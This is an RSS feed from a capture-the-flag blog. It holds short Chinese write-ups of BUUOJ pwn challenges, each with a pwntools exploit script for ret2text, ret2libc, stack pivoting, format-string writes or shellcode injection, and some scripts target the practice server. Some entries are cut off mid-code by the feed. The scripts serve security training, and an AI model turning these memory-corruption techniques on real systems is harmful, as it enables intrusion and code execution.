<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buuoj on</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/</link><description>Recent content in Buuoj on</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Wed, 29 Mar 2023 04:25:34 +0800</lastBuildDate><atom:link href="https://c3n1gbr0k3n.github.io/writeup/buuoj/index.xml" rel="self" type="application/rss+xml"/><item><title>Jarvisoj_tell_me_somethings</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_tell_me_somethings/</link><pubDate>Fri, 07 Apr 2023 17:59:44 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_tell_me_somethings/</guid><description>0x01 分析 # 简单的栈溢出
有一个打印flag的函数，所以直接ret2text即可
0x02 Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) elf = ELF(&amp;quot;./pwn&amp;quot;) good_game = elf.sym['good_game'] payload = b'a'*0x88 + p64(good_game) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>ciscn_2019_es_2</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_es_2/</link><pubDate>Fri, 07 Apr 2023 16:58:40 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_es_2/</guid><description>0x01 分析 # 这里溢出只能覆盖到函数返回地址
没有现成的getshell函数，也没有 /bin/sh 字符串，所以要想办法写入字符串并将其传递给system函数
从调试可以看到栈中有栈地址，可以通过溢出+printf将其打印出来，然后利用栈迁移来实现攻击
0x02 Exploit # from pwn import* context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27382) leave_ret = 0x80485FD sys_plt = 0x8048400 payload = b'a'*(9*4) o.send(payload) o.recvuntil(b'a'*36) stack = u32(o.recv(4)) log.info(hex(stack)) buf = stack - (0xffffd544 - 0xffffd460) payload = b&amp;quot;aaaa&amp;quot; + p32(sys_plt)*2 + p32(buf+16) + b&amp;quot;/bin/sh&amp;quot; payload = payload.ljust(40, b'\x00') payload += p32(buf) + p32(leave_ret) o.send(payload) o.interactive() 自行调试</description></item><item><title>jarvisoj_fm</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_fm/</link><pubDate>Fri, 07 Apr 2023 14:10:11 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_fm/</guid><description>0x01 分析 # 格式化字符串任意写将x覆盖为4即可
0x02 Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) elf = ELF(&amp;quot;./pwn&amp;quot;) x = elf.sym['x'] payload = p32(x) + b'%11$n' o.sendline(payload) o.interactive() 自行调试</description></item><item><title>bjdctf_2020_babystack2</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babystack2/</link><pubDate>Fri, 07 Apr 2023 14:01:11 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babystack2/</guid><description>0x01 分析 # nbytes本身是无符号类型的，但是它转换成int来比较，而且没有检查负数，对于无符号整数来说负数是一个很大的数字，所以直接输入-1就行，然后就可以溢出实现ret2text了
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 25698) elf = ELF(&amp;quot;./pwn&amp;quot;) backdoor = elf.sym['backdoor'] payload = b'a'*24 + p64(backdoor) o.sendline(&amp;quot;-1&amp;quot;) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>bjdctf_2020_babyrop</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babyrop/</link><pubDate>Fri, 07 Apr 2023 13:46:30 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babyrop/</guid><description>0x01 分析 # 典型的ret2libc
0x02 Exploit # from pwn import* from LibcSearcher import* # context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 29543) elf = ELF(&amp;quot;./pwn&amp;quot;) puts_plt = elf.plt['puts'] read_got = elf.got['read'] vuln = elf.sym['vuln'] pop_rdi = 0x0000000000400733 o.recvuntil(b'story!\n') payload = b'a'*40 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(vuln) o.sendline(payload) read_addr = u64(o.recv(6) + b&amp;quot;\x00\x00&amp;quot;) libc = LibcSearcher(&amp;quot;read&amp;quot;, read_addr) libc_base = read_addr - libc.dump(&amp;quot;read&amp;quot;) log.info(hex(libc_base)) sys_addr = libc_base + libc.</description></item><item><title>铁人三项(第五赛区)_2018_rop</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9_%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA_2018_rop/</link><pubDate>Fri, 07 Apr 2023 13:19:10 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9_%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA_2018_rop/</guid><description>0x01 分析 # 简单的ret2libc题型
0x02 Exploit # from pwn import* from LibcSearcher import* # context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 29246) elf = ELF(&amp;quot;./pwn&amp;quot;) write_plt = elf.plt['write'] read_got = elf.got['read'] vuln = elf.sym['vulnerable_function'] # leak libc payload = b'a'*140 + p32(write_plt) + p32(vuln) + p32(1) + p32(read_got) + p32(4) o.sendline(payload) read_addr = u32(o.recv(4)) log.info(hex(read_addr)) libc = LibcSearcher(&amp;quot;read&amp;quot;, read_addr) libc_base = read_addr - libc.dump(&amp;quot;read&amp;quot;) sys_addr = libc_base + libc.</description></item><item><title>ciscn_2019_ne_5</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_ne_5/</link><pubDate>Fri, 07 Apr 2023 12:39:30 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_ne_5/</guid><description>0x01 分析 # AddLog函数可以输入128个字符
再通过GetFlag函数就会被溢出
程序里有system函数，而且在程序里找到了 sh 字符串
所以就是简单的ret2libc
0x02 Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) elf = ELF(&amp;quot;./pwn&amp;quot;) sys_plt = elf.plt['system'] sh = next(elf.search(b&amp;quot;sh&amp;quot;)) o.sendline(&amp;quot;administrator&amp;quot;) payload = b'a'*(0x48+4) + p32(sys_plt) + b'a'*4 + p32(sh) o.sendline(&amp;quot;1&amp;quot;) o.sendline(payload) o.sendline(&amp;quot;4&amp;quot;) o.interactive() 自行调试</description></item><item><title>others_shellcode</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/others_shellcode/</link><pubDate>Fri, 07 Apr 2023 12:17:19 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/others_shellcode/</guid><description>0x01 分析 # 这里就是一个execve的系统调用，直接nc连接就可以了
简单的nc题目</description></item><item><title>ciscn_2019_n_5</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_5/</link><pubDate>Fri, 07 Apr 2023 12:04:39 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_5/</guid><description>0x01 分析 # 没有加栈不可执行保护
主要逻辑就是溢出覆盖函数返回地址为shellcode地址
0x02 Exploit # from pwn import* context.arch = 'amd64' o = process(&amp;quot;./pwn&amp;quot;) payload = b'a'*0x28 + p64(0x601080) o.sendline(asm(shellcraft.sh())) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>not_the_same_3dsctf_2016</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/not_the_same_3dsctf_2016/</link><pubDate>Fri, 07 Apr 2023 11:44:07 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/not_the_same_3dsctf_2016/</guid><description>0x01 分析 # 这道题是静态编译的
main函数是一个简单的gets栈溢出，所以可以用ret2syscall、ret2shellcode等方法来做，这里的话我用mprotect修改bss权限然后注入shellcode来做
0x02 Exploit # from pwn import* context.arch = 'i386' o = process(&amp;quot;./pwn&amp;quot;) elf = ELF(&amp;quot;./pwn&amp;quot;) mprotect = elf.sym['mprotect'] gets = elf.sym['gets'] main = elf.sym['main'] bss = 0x80ec000 payload = b'a'*45 + p32(mprotect) + p32(main) + p32(bss) + p32(0x1000) + p32(7) o.sendline(payload) payload = b'a'*45 + p32(gets) + p32(bss) + p32(bss) o.sendline(payload) o.sendline(asm(shellcraft.sh())) o.interactive() 自行调试</description></item></channel></rss>